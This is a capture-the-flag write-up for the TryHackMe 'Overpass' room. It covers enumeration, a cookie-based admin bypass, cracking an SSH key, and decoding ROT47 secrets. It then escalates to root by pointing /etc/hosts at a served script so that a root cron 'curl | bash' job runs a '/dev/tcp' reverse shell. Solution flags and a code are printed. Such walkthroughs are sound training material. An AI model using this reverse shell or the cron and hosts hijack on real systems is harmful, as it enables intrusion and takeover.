# Overpass
What happens when some broke CompSci students make a password manager?

Obviously a perfect commercial success!

There is a TryHackMe subscription code hidden on this box. The first person to find and activate it will get a one month subscription for free! If you're already a subscriber, why not give the code to a friend?

UPDATE: The code is now claimed.
The machine was slightly modified on 2020/09/25. This was only to improve the performance of the machine. It does not affect the process.

## Enumeration
### Port Scanning
The machine has two open ports. SSH (22) and HTTP (80). In the versions is nothing interesting to find at this point.

```
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass]
└─$ nmap $IP                                
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-30 14:52 EDT
Nmap scan report for 10.10.233.24
Host is up (0.41s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.71 seconds
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass]
└─$ nmap -p- -oN nmap/all_ports $IP         
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-30 14:53 EDT
Nmap scan report for 10.10.233.24
Host is up (0.035s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 36.69 seconds
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass/nmap]
└─$ nmap -sC -sV -oN general $IP                                                                                                                        1 ⨯
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-30 15:38 EDT
Nmap scan report for 10.10.233.24
Host is up (0.036s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37968598d1009c1463d9b03475b1f957 (RSA)
|   256 5375fac065daddb1e8dd40b8f6823924 (ECDSA)
|_  256 1c4ada1f36546da6c61700272e67759c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.54 seconds
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass/nmap]
└─$ 
```
### HTTP
[Website](./images/website.png)

On the website we find some information over the software Overpass and the corresponding downloads. Nothing more interesting here. Under the _About Us_ section we found several usernames. Maybe they could be used for something:
[About](./images/about.png)

* Ninja
* Pars
* Szymex
* Bee
* MuirlandOracle

Brute-forcing the webdirectories will reveal some interesting sites:
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass]
└─$ gobuster dir -u http://$IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x php,sh,txt,cgi,html,js,css,py                        130 ⨯
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.233.24
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt,cgi,html,js,css,py,php,sh
[+] Timeout:                 10s
===============================================================
2023/08/30 15:57:24 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 301) [Size: 0] [--> ./]
/img                  (Status: 301) [Size: 0] [--> img/]
/login.js             (Status: 200) [Size: 1779]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/main.js              (Status: 200) [Size: 28]
/main.css             (Status: 200) [Size: 982]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/admin.html           (Status: 200) [Size: 1525]
/css                  (Status: 301) [Size: 0] [--> css/]
/404.html             (Status: 200) [Size: 782]
/cookie.js            (Status: 200) [Size: 1502]

[...]
```

## Exploit HTTP
_/admin_ shows a login page:
[Admin](./images/admin.png)

The corresponding login functionality is the also found: _login.js_.

The specific login function looks as followed:
```js
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

The interesting part here is, that there is a check if the response equals to "Incorrect credentials". Otherwise the function will set a cookie called "SessionToken" with the value of the response without checking it any fourther. Fourther we will be redirected to _/admin_.

So it seems like there is no verification for the value of the cookie. So we can try to generate this cookie with some random value:
[Cookie](./images/cookie.png)

Trying to login again and reload the page afterwards, result in the following response:
[Admin Login](./images/logged_in.png)

Seems like we found the private key of James.

## Cracking the key
The text on the admin page says: "If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you."

So probably it's easy to crack the key. Let's try:

```
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass]
└─$ ssh2john priv_key > priv_key.hash                                                                                                                  1 ⚙
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt priv_key.hash                                                                                     1 ⚙
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (priv_key)     
1g 0:00:00:00 DONE (2023-09-04 17:02) 1.388g/s 18577p/s 18577c/s 18577C/s lisa..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass]
└─$ john --show priv_key.hash                                                                                                                      1 ⨯ 1 ⚙
priv_key:james13

1 password hash cracked, 0 left
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass]
└─$                                                                                                                                                    1 ⚙

```

The password is `james13`.

### Access the system
With the ssh-key we got access to the system and get the first flag:
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass]
└─$ ssh -i priv_key james@10.10.86.132
Enter passphrase for key 'priv_key': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Sep  4 21:08:39 UTC 2023

  System load:  0.08               Processes:           87
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 12%                IP address for eth0: 10.10.86.132
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ ls -al 
total 48
drwxr-xr-x 6 james james 4096 Jun 27  2020 .
drwxr-xr-x 4 root  root  4096 Jun 27  2020 ..
lrwxrwxrwx 1 james james    9 Jun 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Jun 27  2020 .bash_logout
-rw-r--r-- 1 james james 3771 Jun 27  2020 .bashrc
drwx------ 2 james james 4096 Jun 27  2020 .cache
drwx------ 3 james james 4096 Jun 27  2020 .gnupg
drwxrwxr-x 3 james james 4096 Jun 27  2020 .local
-rw-r--r-- 1 james james   49 Jun 27  2020 .overpass
-rw-r--r-- 1 james james  807 Jun 27  2020 .profile
drwx------ 2 james james 4096 Jun 27  2020 .ssh
-rw-rw-r-- 1 james james  438 Jun 27  2020 todo.txt
-rw-rw-r-- 1 james james   38 Jun 27  2020 user.txt
james@overpass-prod:~$ cat user.txt 
thm{65c1aaf000506e56996822c6281e6bf7}
james@overpass-prod:~$ 
```

User flag: `thm{65c1aaf000506e56996822c6281e6bf7}`

## Investigating the system
In the user directory we find also file named 'todo.txt':
```
james@overpass-prod:~$ cat todo.txt 
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
james@overpass-prod:~$
```

Aswell we can find a '.overpass', which probably belongs to the password manager:
```
james@overpass-prod:~$ hexdump -C .overpass 
00000000  2c 4c 51 3f 32 3e 36 51  69 51 24 4a 44 45 36 3e  |,LQ?2>6QiQ$JDE6>|
00000010  51 5b 51 41 32 44 44 51  69 51 44 32 4a 35 43 32  |Q[QA2DDQiQD2J5C2|
00000020  48 3f 3d 4a 3a 3f 38 41  3a 34 45 46 43 36 51 4e  |H?=J:?8A:4EFC6QN|
00000030  2e                                                |.|
00000031
james@overpass-prod:~$ 
james@overpass-prod:~$ cat .overpass 
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.james@overpass-prod:~$ 
james@overpass-prod:~$ 
```

So likely the password we are looking for, is stored in this password safe. We remember a small note, that we found in the source code of the website:
```html
<p>Overpass allows you to securely store different
    passwords for every service, protected using military grade
    <!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->
    cryptography to keep you safe.
</p>
```

_because the Romans used it_ sounds like Caesar Cipher or ROT. But the website also provides us the source code. Maybe we find something in here:
```go
//Load the credentials from the encrypted file
func loadCredsFromFile(filepath string) ([]passListEntry, string) {
        buff, err := ioutil.ReadFile(filepath)
        if err != nil {
                fmt.Println(err.Error())
                return nil, "Failed to open or read file"
        }
        //Decrypt passwords
        buff = []byte(rot47(string(buff)))
        //Load decrypted passwords
        var passlist []passListEntry
        err = json.Unmarshal(buff, &passlist)
        if err != nil {
                fmt.Println(err.Error())
                return nil, "Failed to load creds"
        }
        return passlist, "Ok"
}
```

Our guess was correct, the password manager uses ROT47:
```
        //Decrypt passwords
        buff = []byte(rot47(string(buff)))
```

We can now use a tool like CyberChef to decrypt the file content:
```
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

This seems to be the users password, but we can't find a place where we can use it to escalate our privileges. Also we don't have any sudo rights:
```
james@overpass-prod:~$ sudo -l
[sudo] password for james: 
Sorry, user james may not run sudo on overpass-prod.
james@overpass-prod:~$ 
```

### Crontab
Investigating the crontab, whill show an interesting cronjob:
```
james@overpass-prod:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
james@overpass-prod:~$
```

Espacially:
```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

So the root user runs curl to get the buildscript and than executes it. If we find a way to replace this script we can get root access.

Since we can't change the content of the website, we have to manipulate the called path. If we look at the /etc/hosts the following stands out:
```
james@overpass-prod:~$ ls -al /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
james@overpass-prod:~$ 
```

We have rw access to the /etc/hosts. So we are able to replace the entry for overpass.thm with our own ip. On our system we have to provide the same path.

### Exploit
First we edit the /etc/hosts, so that the domain overpass.thm is referencing to our system:
```
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
#127.0.0.1 overpass.thm
10.9.45.203 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
james@overpass-prod:~$ 
```

Then we create a script, which will run on the target system and sends us a reverse shell:
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass]
└─$ cat downloads/src/buildscript.sh                                                                                                                    1 ⚙
bash -i >& /dev/tcp/10.9.45.203/8081 0>&1
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass]
└─$ 

```

Now we can start our http server:
```
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass]
└─$ cat downloads/src/buildscript.sh                                                                                                                    1 ⚙
bash -i >& /dev/tcp/10.9.45.203/8081 0>&1
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/tryhackme/overpass]
└─$ python3 -m http.server 80                                                                                                                       1 ⨯ 1 ⚙
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.86.132 - - [04/Sep/2023 18:27:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -


```

And the last step is to listen for incoming traffic from the reverse shell:
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8081
Listening on 0.0.0.0 8081
Connection received on 10.10.86.132 59032
bash: cannot set terminal process group (4471): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# ^[[A

root@overpass-prod:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@overpass-prod:~# 
```

And here we go. We have root access to the system.

Now we just have to grab the root flag and the room is solved:
```
root@overpass-prod:~# ls -al   
ls -al
total 60
drwx------  8 root root  4096 Jun 27  2020 .
drwxr-xr-x 23 root root  4096 Jun 27  2020 ..
lrwxrwxrwx  1 root root     9 Jun 27  2020 .bash_history -> /dev/null
-rw-------  1 root root  3106 Apr  9  2018 .bashrc
drwx------  3 root root  4096 Jun 27  2020 .cache
drwx------  3 root root  4096 Jun 27  2020 .local
-rw-------  1 root root   184 Jun 27  2020 .profile
drwx------  2 root root  4096 Jun 27  2020 .ssh
-rw-r--r--  1 root root 14308 Sep  4 22:20 buildStatus
drwx------  2 root root  4096 Jun 27  2020 builds
drwxr-xr-x  4 root root  4096 Jun 27  2020 go
-rw-------  1 root root    38 Jun 27  2020 root.txt
drwx------  2 root root  4096 Jun 27  2020 src
root@overpass-prod:~# cat root.txt
cat root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}
root@overpass-prod:~# 
```

Root flag: `thm{7f336f8c359dbac18d54fdd64ea753bb}`

## Bonus flag
Although the room is pretty old and the subscription was already found, the room description says: _There is a TryHackMe subscription code hidden on this box._

So it sounds like a little bonus flag.

Taking a look at the home directy of the tryhackme user, which runs the webserver, we find another '.overpass' file:
```
root@overpass-prod:/home/tryhackme# cat .overpass
cat .overpass
,LQ?2>6QiQ%CJw24<|6 $F3D4C:AE:@? r@56Q[QA2DDQiQ8>%sJ=QN.root@overpass-prod:/home/tryhackme# 

root@overpass-prod:/home/tryhackme# 
```

If we decrypt the content, we get the following text:
```
[{"name":"TryHackMe Subscription Code","pass":"gmTDyl"}]
```

So we also found this kinda bonus flag.
